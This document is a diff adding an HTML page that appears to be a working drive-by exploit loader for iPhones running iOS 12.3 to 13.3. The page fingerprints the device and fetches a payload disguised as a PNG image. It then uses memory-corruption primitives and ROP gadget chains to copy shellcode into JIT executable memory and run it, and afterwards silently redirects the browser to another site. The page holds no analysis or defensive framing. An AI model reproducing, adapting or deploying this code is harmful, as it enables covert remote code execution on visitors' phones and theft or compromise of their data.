@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>130401</title>
+        <script type="text/javascript">
+			      print = function(msg) { document.body.innerText += msg + '\n';}
+	      </script>	
+	      <script type="text/javascript" src="int64.js"></script>
+				<script type="text/javascript" src="offsets.js"></script>
+				<script type="text/javascript" src="device.js"></script>		
+				<script type="text/javascript" src="binary.js"></script>
+				<script type="text/javascript" src="primitives130401.js"></script>
+				<script type="text/javascript" src="wrapper.js"></script>
+				<script type="text/javascript" src="gadget.js"></script>
+				
+    </head>
+    <body>
+    	  <script type="text/javascript">
+
+					try {
+						
+						print("Here we go...");
+						function get_pnp(url = '', callback = function(req){})
+						{
+								var req = new XMLHttpRequest();
+								req.open("GET", url, true);
+								req.responseType = "arraybuffer";
+								if(callback){
+									req.addEventListener('load', callback);
+									req.send(null);
+									return;
+								} else {
+									req.send(null);
+								}
+						};
+
+						function init(resolve, reject) {
+													
+							setTimeout(function () {
+								
+										print("[+] start check device...");
+									  SupportTarget("iPhone 6", [12.3,12.31,12.4,12.41], "any");
+									  SupportTarget("iPhone 6+", [12.3,12.31,12.4,12.41], "any");
+									  SupportTarget("iPhone 6S", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone 6S+", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone 7", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone 7+", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone 8", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone 8+", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  SupportTarget("iPhone X", [12.3,12.31,12.4,12.41,13.0,13.1,13.11,13.12,13.13,13.2,13.22,13.23,13.3], "any");
+									  
+						
+										if (!issupported())
+										{
+												print("[-] your device is not support...");
+												reject("your device is not support...");
+												return;
+										}
+										//assert offsets
+										if(typeof offsets[currentdevice.os.version] === 'undefined')
+										{
+												print("[-] your os version missing offsets...");
+												reject("your device is not support...");
+												return;
+										}
+										if(typeof offsets[currentdevice.os.version][currentdevice.device[0]] === 'undefined')
+										{
+											  print("[-] your device missing offsets...");
+												reject("your device is not support...");
+												return;
+										}
+										
+										var pngname = "20012001330.png";
+										if(currentdevice.os.version < 13)
+										   pngname = "20012001241.png";
+										//alert("png="+pngname);
+										print("[+] 	start load.");
+										get_pnp(pngname, function () {
+												var buf = this.response;
+												var arrayBuf = new Uint8Array(buf);
+									      window.binary = arrayBuf;
+												//var arrayBuf2 = new Uint8Array(buf);
+												//window.binary2 = arrayBuf2;
+												window.prestage = offsets[currentdevice.os.version][currentdevice.device[0]];	
+												print("[+] load payload complete.");	
+									      resolve('ok');		
+											}
+										);
+																				
+									}, 1);	
+						};
+															      
+				    function wego()
+				    {								
+								_offset = window.prestage;
+							  __gc();
+
+						    var primitive = new Primitives();
+								var divWrapper = new WrapperDiv(primitive, _offset.vtable);
+								
+							  var startOfFixedExecutableMemoryPool;
+							  var endOfFixedExecutableMemoryPool;
+							  if(_offset.fixedmem_ver == 2){
+							  		startOfFixedExecutableMemoryPool = divWrapper.startOfFixedExecutableMemoryPoolC8(_offset.fixedmempool);
+							  		endOfFixedExecutableMemoryPool = divWrapper.endOfFixedExecutableMemoryPoolD0(_offset.fixedmempool);
+							  }else if(_offset.fixedmem_ver == 3){
+										startOfFixedExecutableMemoryPool = divWrapper.startOfFixedExecutableMemoryPoolC0(_offset.fixedmempool);
+										endOfFixedExecutableMemoryPool = divWrapper.endOfFixedExecutableMemoryPoolC8(_offset.fixedmempool);
+							  }else if(_offset.fixedmem_ver == 4){							  	 
+  									startOfFixedExecutableMemoryPool = divWrapper.startOfFixedExecutableMemoryPool18(_offset.fixedmempool);
+  									endOfFixedExecutableMemoryPool = divWrapper.endOfFixedExecutableMemoryPool20(_offset.fixedmempool);
+							  }
+							  //alert("startOfFixedExecutableMemoryPool="+startOfFixedExecutableMemoryPool);
+							  //alert("endOfFixedExecutableMemoryPool="+endOfFixedExecutableMemoryPool);
+							
+								var setjmp = divWrapper.getSlideAddr(_offset.setjmp);
+								var longjmp = divWrapper.getSlideAddr(_offset.longjmp);
+								var dlsym = divWrapper.getSlideAddr(_offset.dlsym);
+
+								findentry();
+						    /////=================================================================================================
+								//write payload to codeaddr, then shellcode();
+								/////=================================================================================================
+
+								var plsz = new Int64(window.payload.byteLength);
+								var paddr = primitive.read64(Add(primitive.addrof(window.payload), 0x10));
+								var codeAddr = Sub(endOfFixedExecutableMemoryPool, plsz);
+								codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
+								var jmpAddr = Add(psyms["_bridge"], codeAddr);
+								//alert("jmpAddr="+jmpAddr);
+						
+								var binaryaddr = primitive.read64(Add(primitive.addrof(window.binary), 0x10));
+								
+								var gadget = new Gadgets(primitive);
+	
+								//stackloader,mov_x8_x24,regloader_x8,mov_x8_x27,dispatch_x8
+								gadget.setGadgetsV2(
+									divWrapper.getSlideAddr(_offset.stackloader),
+									divWrapper.getSlideAddr(_offset.mov_x8_x24),
+									divWrapper.getSlideAddr(_offset.regloader_x8),
+									divWrapper.getSlideAddr(_offset.mov_x8_x27),
+									divWrapper.getSlideAddr(_offset.dispatch_x8));
+									
+								divWrapper.preStackCall(_offset.addeventoffset, _offset.setjmp, _offset.x30_orig);
+								//-----------------------------
+								var performJITMemcpy = Int64.Zero;
+								performJITMemcpy = divWrapper.getSlideAddr(_offset.performJITMemcpy_func);
+								gadget.addCallV2(performJITMemcpy, codeAddr, paddr, plsz);					
+								gadget.addCallV2(jmpAddr, binaryaddr, dlsym, 0, endOfFixedExecutableMemoryPool, performJITMemcpy);
+								gadget.addCallV2(longjmp, divWrapper.jmpbufAddr);			
+								divWrapper.stackCall(_offset.addeventoffset, _offset.longjmp, _offset.stackloader, gadget.getSp());
+			          /*
+								alert("Enter Check!");
+								var flagvalue = primitive.readbytes(binaryaddr,8);
+								alert("flagvalue(0x1122334455667788)="+flagvalue);
+								alert("Leave Check!");
+								*/
+								location.href = "http://www.baidu.com";								
+				    };
+						
+					}
+					catch (ex) {
+						print("The progam load contains a bug, here is the trace: " + ex.message + '\n' + ex.stack);
+					}
+	
+					function ttt(){
+						
+						new Promise(init).then(function (result) {
+							  setTimeout(wego, 500);
+						}).then(function (result) {
+						}).catch(function (reason) {					 
+							 print("[-] fail:"+reason);
+						});
+					}
+					setTimeout(ttt, 500);
+			</script>
+    </body>
+</html>
